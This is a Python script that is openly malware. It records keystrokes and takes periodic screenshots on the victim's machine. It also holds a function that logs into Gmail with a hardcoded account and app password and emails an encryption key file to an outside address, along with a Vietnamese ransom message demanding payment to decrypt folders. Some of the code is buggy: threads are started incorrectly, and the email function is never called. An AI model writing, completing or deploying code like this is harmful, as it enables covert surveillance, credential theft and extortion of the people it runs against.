import keyboard as kb
import time
import threading
import pyscreenshot as imagegrab
import os
import shutil
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
# keylog function records all the keystrokes along with the time at which they were recorded in a text file named log.
def keylog():
  # Open a file named log.txt in append mode to add new keystrokes to the end of the file
  log_f = open("log.txt", 'a')
  # Write a header to the log file to indicate the start of a new log session
  log_f.write("\n\n-----------------------Keyboard Log-----------------------\n\n")

  # Define a callback function to handle keyboard events
  def on_press(key):
    # Get the current time in seconds since the epoch (January 1, 1970)
    curr_time_since_epoch = time.time()
    # Convert the current time in seconds since the epoch to a human-readable string
    curr_time = time.ctime(curr_time_since_epoch)
    # Write the current time and the key that was pressed to the log file
    log_f.write(str(curr_time) + " : " + str(key) + "\n")
    # Flush the log file to ensure that the keystroke is written to the file immediately
    log_f.flush()

  # Register the on_press function as a callback for keyboard events
  kb.on_press(on_press)
  # Wait for keyboard events to occur
  try:
    kb.wait()
  except KeyboardInterrupt:
    print("Logging stopped by user.")
    log_f.close()
  # Close the log file
  log_f.close()
def screenshot():
    save_folder = r"D:\Screenshots"
    os.makedirs(save_folder, exist_ok=True)

    count = 0
    while True:
      # Capture the entire screen
      image = imagegrab.grab()

      # Generate filename with timestamp or count
      filename = f"screenshot_{count}_{int(time.time())}.png"
      filepath = os.path.join(save_folder, filename)

      # Save the screenshot
      image.save(filepath)
      print(f"Saved {filepath}")

      count += 1

      # Wait for 60 seconds
      time.sleep(5)


def connectGmail1():
  time.sleep(10)
  src_email = "hackerdentutuonglai200@gmail.com"
  des_email = 'mn.nguyen0210@gmail.com'
  s = smtplib.SMTP('smtp.gmail.com', 587)
  s.starttls()
  s.login(src_email, 'hyrn zhnd jcdl ysju')
  mess = MIMEMultipart()
  mess['From'] = src_email
  mess['To'] = des_email
  mess['Subject'] = 'Ma hoa thu muc'
  mess.attach(MIMEText("Thu muc da bi ma hoa:\nhay nap 50k de giai ma:", "plain", "utf-8"))
  with open('encryptKey.pem', "rb") as attachment:
    part = MIMEBase("application", "octet-stream")
    part.set_payload(attachment.read())

  # Encode file in ASCII characters to send by email
  encoders.encode_base64(part)

  # Add header as key/value pair to attachment part
  part.add_header("Content-Disposition", f"attachment; filename= encryptKey.pem")

  # Add attachment to message
  mess.attach(part)
  s.sendmail(src_email, des_email, mess.as_string())
  s.quit()

def connectGmail():
  shutil.make_archive("D:\image_screenshot", 'zip', "D:\Screenshots")
  time.sleep(20)


# Run both in separate threads
thread_screen = threading.Thread(target=screenshot())
thread_keylogger = threading.Thread(target=keylog())
thread_sendmail = threading.Thread(target=connectGmail())

thread_screen.start()
thread_keylogger.start()
thread_sendmail.start()
# Keep main thread alive
thread_screen.join()
thread_keylogger.join()
thread_sendmail.join()